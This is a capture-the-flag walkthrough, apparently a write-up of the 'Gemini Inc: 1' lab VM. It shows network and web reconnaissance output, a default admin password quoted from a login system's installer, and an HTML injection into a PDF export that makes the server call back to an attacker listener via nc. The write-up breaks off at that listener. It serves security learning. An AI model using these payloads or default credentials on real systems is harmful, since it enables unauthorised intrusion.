#### Gemini Inc: 1

- [Attacker Info]()
- [Identify Victim]()
- [Nmap Scan]()
- [Masscan]()
- [Web Enumeration]()
- [Export Injection]()
- [Privilege Escalation]()
- [Binary Hijacking]()

###### Attacker Info

```sh
root@kali:~# ifconfig 
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.13  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fe6c:8595  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:6c:85:95  txqueuelen 1000  (Ethernet)
        RX packets 642  bytes 819662 (800.4 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 164  bytes 12551 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# 
```

###### Identify Victim

```sh
root@kali:~# netdiscover 

 Currently scanning: 192.168.99.0/16   |   Screen View: Unique Hosts                                                                                         
                                                                                                                                                             
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     a0:63:91:f0:cc:4b      1      60  NETGEAR                                                                                                   
 192.168.1.5     f4:0f:24:33:5e:d1      1      60  Apple, Inc.                                                                                               
 192.168.1.14    00:0c:29:65:22:bd      1      60  VMware, Inc.                                                                                              
 192.168.1.7     d0:2b:20:dc:d7:f0      1      60  Apple, Inc.                                                                                               

root@kali:~# 
```

###### Nmap Scan

```sh
root@kali:~/gemini# nmap -sV -sC -oA gemini.nmap 192.168.1.14 -p-
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-19 12:52 EDT
Nmap scan report for 192.168.1.14
Host is up (0.00038s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 e9:e3:89:b6:3b:ea:e4:13:c8:ac:38:44:d6:ea:c0:e4 (RSA)
|   256 8c:19:77:fd:36:72:7e:34:46:c4:29:2d:2a:ac:15:98 (ECDSA)
|_  256 cc:2b:4c:ce:d7:61:73:d7:d8:7e:24:56:74:54:99:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-01-07 08:35  test2/
|_
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
MAC Address: 00:0C:29:65:22:BD (VMware)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
root@kali:~/gemini# 
```

###### Masscan

```sh
root@kali:~/gemini# masscan 192.168.1.14 -p 0-65535

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2018-05-19 16:54:32 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 22/tcp on 192.168.1.14                                    
Discovered open port 80/tcp on 192.168.1.14                                    
root@kali:~/gemini#
```

###### Web Enumeration

```
http://192.168.1.14/
http://192.168.1.14/test2/
http://192.168.1.14/test2/login.php
```

![](images/1.png)

![](images/2.png)

![](images/3.png)

```sh
root@kali:~# nikto -h http://192.168.1.14/test2
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.1.14
+ Target Hostname:    192.168.1.14
+ Target Port:        80
+ Start Time:         2018-05-19 14:03:59 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /test2/favicon.ico, fields: 0x2fe 0x55c9586bd7900 
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-3092: /test2/img/: This might be interesting...
+ OSVDB-3092: /test2/lib/: This might be interesting...
+ /test2/login.php: Admin login page/section found.
+ 7535 requests: 0 error(s) and 11 item(s) reported on remote host
+ End Time:           2018-05-19 14:04:12 (GMT-4) (13 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.25) are not in
      the Nikto database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? n

root@kali:~# 
```

```sh
root@kali:~# dirb http://192.168.1.14/test2

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat May 19 14:14:00 2018
URL_BASE: http://192.168.1.14/test2/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.14/test2/ ----
==> DIRECTORY: http://192.168.1.14/test2/css/                                                                                                                
+ http://192.168.1.14/test2/favicon.ico (CODE:200|SIZE:766)                                                                                                  
==> DIRECTORY: http://192.168.1.14/test2/img/                                                                                                                
==> DIRECTORY: http://192.168.1.14/test2/inc/                                                                                                                
+ http://192.168.1.14/test2/index.php (CODE:200|SIZE:6066)                                                                                                   
==> DIRECTORY: http://192.168.1.14/test2/js/                                                                                                                 
==> DIRECTORY: http://192.168.1.14/test2/lib/                                                                                                                
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/css/ ----
+ http://192.168.1.14/test2/css/index.html (CODE:200|SIZE:566)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/img/ ----
+ http://192.168.1.14/test2/img/index.html (CODE:200|SIZE:428)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/inc/ ----
+ http://192.168.1.14/test2/inc/index.html (CODE:200|SIZE:266)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/js/ ----
+ http://192.168.1.14/test2/js/index.html (CODE:200|SIZE:252)                                                                                                
==> DIRECTORY: http://192.168.1.14/test2/js/vendor/                                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/lib/ ----
==> DIRECTORY: http://192.168.1.14/test2/lib/captcha/                                                                                                        
+ http://192.168.1.14/test2/lib/index.html (CODE:200|SIZE:490)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/js/vendor/ ----
+ http://192.168.1.14/test2/js/vendor/index.html (CODE:200|SIZE:508)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/lib/captcha/ ----
+ http://192.168.1.14/test2/lib/captcha/index.html (CODE:200|SIZE:384)                                                                                       
+ http://192.168.1.14/test2/lib/captcha/index.php (CODE:302|SIZE:0)                                                                                          
                                                                                                                                                             
-----------------
END_TIME: Sat May 19 14:14:31 2018
DOWNLOADED: 36896 - FOUND: 10
root@kali:~# 
```

```sh
root@kali:~# dirb http://192.168.1.14

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat May 19 14:14:37 2018
URL_BASE: http://192.168.1.14/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.14/ ----
==> DIRECTORY: http://192.168.1.14/manual/                                                                                                                   
+ http://192.168.1.14/server-status (CODE:403|SIZE:300)                                                                                                      
==> DIRECTORY: http://192.168.1.14/test2/                                                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ ----
==> DIRECTORY: http://192.168.1.14/manual/da/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/de/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/en/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/es/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/fr/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/images/                                                                                                            
+ http://192.168.1.14/manual/index.html (CODE:200|SIZE:626)                                                                                                  
==> DIRECTORY: http://192.168.1.14/manual/ja/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/ko/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/style/                                                                                                             
==> DIRECTORY: http://192.168.1.14/manual/tr/                                                                                                                
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/                                                                                                             
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/ ----
==> DIRECTORY: http://192.168.1.14/test2/css/                                                                                                                
+ http://192.168.1.14/test2/favicon.ico (CODE:200|SIZE:766)                                                                                                  
==> DIRECTORY: http://192.168.1.14/test2/img/                                                                                                                
==> DIRECTORY: http://192.168.1.14/test2/inc/                                                                                                                
+ http://192.168.1.14/test2/index.php (CODE:200|SIZE:6066)                                                                                                   
==> DIRECTORY: http://192.168.1.14/test2/js/                                                                                                                 
==> DIRECTORY: http://192.168.1.14/test2/lib/                                                                                                                
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/ ----
==> DIRECTORY: http://192.168.1.14/manual/da/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/da/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/da/howto/                                                                                                          
+ http://192.168.1.14/manual/da/index.html (CODE:200|SIZE:9117)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/da/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/da/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/da/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/da/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/ ----
==> DIRECTORY: http://192.168.1.14/manual/de/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/de/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/de/howto/                                                                                                          
+ http://192.168.1.14/manual/de/index.html (CODE:200|SIZE:9544)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/de/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/de/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/de/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/de/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/ ----
==> DIRECTORY: http://192.168.1.14/manual/en/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/en/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/en/howto/                                                                                                          
+ http://192.168.1.14/manual/en/index.html (CODE:200|SIZE:9352)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/en/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/en/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/en/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/en/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/ ----
==> DIRECTORY: http://192.168.1.14/manual/es/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/es/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/es/howto/                                                                                                          
+ http://192.168.1.14/manual/es/index.html (CODE:200|SIZE:9810)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/es/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/es/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/es/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/es/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/ ----
==> DIRECTORY: http://192.168.1.14/manual/fr/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/fr/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/fr/howto/                                                                                                          
+ http://192.168.1.14/manual/fr/index.html (CODE:200|SIZE:9655)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/fr/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/fr/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/fr/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/fr/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/ ----
==> DIRECTORY: http://192.168.1.14/manual/ja/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/ja/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/ja/howto/                                                                                                          
+ http://192.168.1.14/manual/ja/index.html (CODE:200|SIZE:9935)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/ja/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/ja/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/ja/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/ja/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/ ----
==> DIRECTORY: http://192.168.1.14/manual/ko/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/ko/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/ko/howto/                                                                                                          
+ http://192.168.1.14/manual/ko/index.html (CODE:200|SIZE:8585)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/ko/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/ko/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/ko/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/ko/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/style/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/ ----
==> DIRECTORY: http://192.168.1.14/manual/tr/developer/                                                                                                      
==> DIRECTORY: http://192.168.1.14/manual/tr/faq/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/tr/howto/                                                                                                          
+ http://192.168.1.14/manual/tr/index.html (CODE:200|SIZE:9569)                                                                                              
==> DIRECTORY: http://192.168.1.14/manual/tr/misc/                                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/tr/mod/                                                                                                            
==> DIRECTORY: http://192.168.1.14/manual/tr/programs/                                                                                                       
==> DIRECTORY: http://192.168.1.14/manual/tr/ssl/                                                                                                            
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/ ----
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/developer/                                                                                                   
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/faq/                                                                                                         
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/howto/                                                                                                       
+ http://192.168.1.14/manual/zh-cn/index.html (CODE:200|SIZE:8955)                                                                                           
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/misc/                                                                                                        
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/mod/                                                                                                         
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/programs/                                                                                                    
==> DIRECTORY: http://192.168.1.14/manual/zh-cn/ssl/                                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/css/ ----
+ http://192.168.1.14/test2/css/index.html (CODE:200|SIZE:566)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/img/ ----
+ http://192.168.1.14/test2/img/index.html (CODE:200|SIZE:428)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/inc/ ----
+ http://192.168.1.14/test2/inc/index.html (CODE:200|SIZE:266)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/js/ ----
+ http://192.168.1.14/test2/js/index.html (CODE:200|SIZE:252)                                                                                                
==> DIRECTORY: http://192.168.1.14/test2/js/vendor/                                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/lib/ ----
==> DIRECTORY: http://192.168.1.14/test2/lib/captcha/                                                                                                        
+ http://192.168.1.14/test2/lib/index.html (CODE:200|SIZE:490)                                                                                               
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/developer/ ----
+ http://192.168.1.14/manual/da/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/faq/ ----
+ http://192.168.1.14/manual/da/faq/index.html (CODE:200|SIZE:3880)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/howto/ ----
+ http://192.168.1.14/manual/da/howto/index.html (CODE:200|SIZE:8186)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/misc/ ----
+ http://192.168.1.14/manual/da/misc/index.html (CODE:200|SIZE:5182)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/mod/ ----
+ http://192.168.1.14/manual/da/mod/index.html (CODE:200|SIZE:22915)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/programs/ ----
+ http://192.168.1.14/manual/da/programs/index.html (CODE:200|SIZE:6973)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/da/ssl/ ----
+ http://192.168.1.14/manual/da/ssl/index.html (CODE:200|SIZE:5125)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/developer/ ----
+ http://192.168.1.14/manual/de/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/faq/ ----
+ http://192.168.1.14/manual/de/faq/index.html (CODE:200|SIZE:3880)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/howto/ ----
+ http://192.168.1.14/manual/de/howto/index.html (CODE:200|SIZE:8186)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/misc/ ----
+ http://192.168.1.14/manual/de/misc/index.html (CODE:200|SIZE:5182)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/mod/ ----
+ http://192.168.1.14/manual/de/mod/index.html (CODE:200|SIZE:23107)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/programs/ ----
+ http://192.168.1.14/manual/de/programs/index.html (CODE:200|SIZE:6973)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/de/ssl/ ----
+ http://192.168.1.14/manual/de/ssl/index.html (CODE:200|SIZE:5125)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/developer/ ----
+ http://192.168.1.14/manual/en/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/faq/ ----
+ http://192.168.1.14/manual/en/faq/index.html (CODE:200|SIZE:3880)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/howto/ ----
+ http://192.168.1.14/manual/en/howto/index.html (CODE:200|SIZE:8186)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/misc/ ----
+ http://192.168.1.14/manual/en/misc/index.html (CODE:200|SIZE:5182)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/mod/ ----
+ http://192.168.1.14/manual/en/mod/index.html (CODE:200|SIZE:22915)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/programs/ ----
+ http://192.168.1.14/manual/en/programs/index.html (CODE:200|SIZE:6973)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/en/ssl/ ----
+ http://192.168.1.14/manual/en/ssl/index.html (CODE:200|SIZE:5125)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/developer/ ----
+ http://192.168.1.14/manual/es/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/faq/ ----
+ http://192.168.1.14/manual/es/faq/index.html (CODE:200|SIZE:3976)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/howto/ ----
+ http://192.168.1.14/manual/es/howto/index.html (CODE:200|SIZE:8186)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/misc/ ----
+ http://192.168.1.14/manual/es/misc/index.html (CODE:200|SIZE:5182)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/mod/ ----
+ http://192.168.1.14/manual/es/mod/index.html (CODE:200|SIZE:23281)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/programs/ ----
+ http://192.168.1.14/manual/es/programs/index.html (CODE:200|SIZE:7441)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/es/ssl/ ----
+ http://192.168.1.14/manual/es/ssl/index.html (CODE:200|SIZE:5125)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/developer/ ----
+ http://192.168.1.14/manual/fr/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/faq/ ----
+ http://192.168.1.14/manual/fr/faq/index.html (CODE:200|SIZE:3882)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/howto/ ----
+ http://192.168.1.14/manual/fr/howto/index.html (CODE:200|SIZE:8556)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/misc/ ----
+ http://192.168.1.14/manual/fr/misc/index.html (CODE:200|SIZE:5483)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/mod/ ----
+ http://192.168.1.14/manual/fr/mod/index.html (CODE:200|SIZE:24849)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/programs/ ----
+ http://192.168.1.14/manual/fr/programs/index.html (CODE:200|SIZE:7261)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/fr/ssl/ ----
+ http://192.168.1.14/manual/fr/ssl/index.html (CODE:200|SIZE:5267)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/developer/ ----
+ http://192.168.1.14/manual/ja/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/faq/ ----
+ http://192.168.1.14/manual/ja/faq/index.html (CODE:200|SIZE:3880)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/howto/ ----
+ http://192.168.1.14/manual/ja/howto/index.html (CODE:200|SIZE:8009)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/misc/ ----
+ http://192.168.1.14/manual/ja/misc/index.html (CODE:200|SIZE:5182)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/mod/ ----
+ http://192.168.1.14/manual/ja/mod/index.html (CODE:200|SIZE:24217)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/programs/ ----
+ http://192.168.1.14/manual/ja/programs/index.html (CODE:200|SIZE:6973)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ja/ssl/ ----
+ http://192.168.1.14/manual/ja/ssl/index.html (CODE:200|SIZE:5345)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/developer/ ----
+ http://192.168.1.14/manual/ko/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/faq/ ----
+ http://192.168.1.14/manual/ko/faq/index.html (CODE:200|SIZE:3880)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/howto/ ----
+ http://192.168.1.14/manual/ko/howto/index.html (CODE:200|SIZE:6445)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/misc/ ----
+ http://192.168.1.14/manual/ko/misc/index.html (CODE:200|SIZE:5269)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/mod/ ----
+ http://192.168.1.14/manual/ko/mod/index.html (CODE:200|SIZE:22347)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/programs/ ----
+ http://192.168.1.14/manual/ko/programs/index.html (CODE:200|SIZE:5845)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/ko/ssl/ ----
+ http://192.168.1.14/manual/ko/ssl/index.html (CODE:200|SIZE:5125)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/developer/ ----
+ http://192.168.1.14/manual/tr/developer/index.html (CODE:200|SIZE:6030)                                                                                    
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/faq/ ----
+ http://192.168.1.14/manual/tr/faq/index.html (CODE:200|SIZE:3887)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/howto/ ----
+ http://192.168.1.14/manual/tr/howto/index.html (CODE:200|SIZE:8186)                                                                                        
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/misc/ ----
+ http://192.168.1.14/manual/tr/misc/index.html (CODE:200|SIZE:5410)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/mod/ ----
+ http://192.168.1.14/manual/tr/mod/index.html (CODE:200|SIZE:23193)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/programs/ ----
+ http://192.168.1.14/manual/tr/programs/index.html (CODE:200|SIZE:7476)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/tr/ssl/ ----
+ http://192.168.1.14/manual/tr/ssl/index.html (CODE:200|SIZE:5267)                                                                                          
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/developer/ ----
+ http://192.168.1.14/manual/zh-cn/developer/index.html (CODE:200|SIZE:6066)                                                                                 
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/faq/ ----
+ http://192.168.1.14/manual/zh-cn/faq/index.html (CODE:200|SIZE:3846)                                                                                       
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/howto/ ----
+ http://192.168.1.14/manual/zh-cn/howto/index.html (CODE:200|SIZE:6637)                                                                                     
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/misc/ ----
+ http://192.168.1.14/manual/zh-cn/misc/index.html (CODE:200|SIZE:4878)                                                                                      
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/mod/ ----
+ http://192.168.1.14/manual/zh-cn/mod/index.html (CODE:200|SIZE:22794)                                                                                      
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/programs/ ----
+ http://192.168.1.14/manual/zh-cn/programs/index.html (CODE:200|SIZE:6904)                                                                                  
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/manual/zh-cn/ssl/ ----
+ http://192.168.1.14/manual/zh-cn/ssl/index.html (CODE:200|SIZE:5113)                                                                                       
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/js/vendor/ ----
+ http://192.168.1.14/test2/js/vendor/index.html (CODE:200|SIZE:508)                                                                                         
                                                                                                                                                             
---- Entering directory: http://192.168.1.14/test2/lib/captcha/ ----
+ http://192.168.1.14/test2/lib/captcha/index.html (CODE:200|SIZE:384)                                                                                       
+ http://192.168.1.14/test2/lib/captcha/index.php (CODE:302|SIZE:0)                                                                                          
                                                                                                                                                             
-----------------
END_TIME: Sat May 19 14:20:09 2018
DOWNLOADED: 378184 - FOUND: 84
root@kali:~# 
```

[`master-login-system/install.php`](https://github.com/ionutvmi/master-login-system/blob/master/install.php)

```php
if(!isset($page->error)) {
    $page->success = "The installation was successful ! Thank you for using master loging system and we hope you enjo it ! Have fun ! <br/><br/>
    <a class='btn btn-success' href='./index.php'>Start exploring</a>
    <br/><br/>
    <h3>USER: admin <br/> PASSWORD: 1234</h3>";
  }
```

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

![](images/8.png)

![](images/9.png)

![](images/10.png)

![](images/11.png)

![](images/12.png)

![](images/13.png)

![](images/14.png)

![](images/15.png)

![](images/16.png)

![](images/17.png)

###### [Export Injection](https://securityonline.info/export-injection-new-server-side-vulnerability/)

- [`wkhtmltopdf`](https://wkhtmltopdf.org/)

![](images/18.png)

![](images/19.png)

![](images/20.png)

![](images/21.png)

```html
<img src=x>
```

![](images/22.png)

![](images/23.png)

```html
<img src="http://192.168.1.13:1337/a">
```

![](images/24.png)

![](images/25.png)

```sh
root@kali:~# nc -nlvp 1337
listening on [any] 1337 ...
